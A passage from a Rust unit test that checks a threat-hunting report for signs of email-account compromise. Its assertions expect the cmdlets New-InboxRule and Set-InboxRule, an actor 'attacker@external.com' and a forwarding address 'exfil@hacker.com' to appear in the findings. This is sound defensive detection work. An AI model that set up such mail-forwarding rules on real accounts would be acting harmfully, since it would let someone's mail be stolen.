        assert_eq!(answer.sections.len(), 2);
        assert_eq!(answer.sections[0].heading, "Hunt Findings: Inbox Rules & Mail Forwarding");
        assert_eq!(answer.sections[1].heading, "Keyword Timeline");

        let hunt_text: String = answer.sections[0].lines.iter().map(|l| l.text.clone()).collect::<Vec<_>>().join(" ");
        assert!(hunt_text.contains("New-InboxRule"), "Findings must highlight New-InboxRule: {hunt_text}");
        assert!(hunt_text.contains("Set-InboxRule"), "Findings must highlight Set-InboxRule: {hunt_text}");
        assert!(hunt_text.contains("attacker@external.com"), "Findings must highlight actor: {hunt_text}");
        assert!(hunt_text.contains("exfil@hacker.com"), "Findings must highlight ForwardTo recipient: {hunt_text}");
    }
}
